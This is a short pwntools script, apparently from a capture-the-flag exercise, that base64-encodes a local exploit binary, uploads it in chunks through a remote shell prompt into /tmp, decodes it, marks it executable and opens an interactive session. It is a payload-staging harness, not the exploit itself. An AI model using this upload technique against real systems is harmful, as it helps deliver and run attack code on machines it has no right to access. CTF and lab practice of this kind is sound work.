#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import base64

from pwn import *

# elf = context.binary = ELF("./bin-chall-00")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


def run(cmd: str):
    io.sendlineafter(b"$ ", cmd.encode())


with open("./exploit", "rb") as f:
    payload = base64.b64encode(f.read()).decode()


env = {}
# io = start()
io = process(["./run.sh"])
run("cd /tmp")

with log.progress("Uploading") as prog:
    for i in range(0, len(payload), 512):
        prog.status(f"{i:x} / {len(payload):x}")
        run(f"echo -n '{payload[i:i+512]}' >> b64exp")

run("base64 -d b64exp > exploit")
run("rm b64exp")
run("chmod +x exploit")

io.interactive()
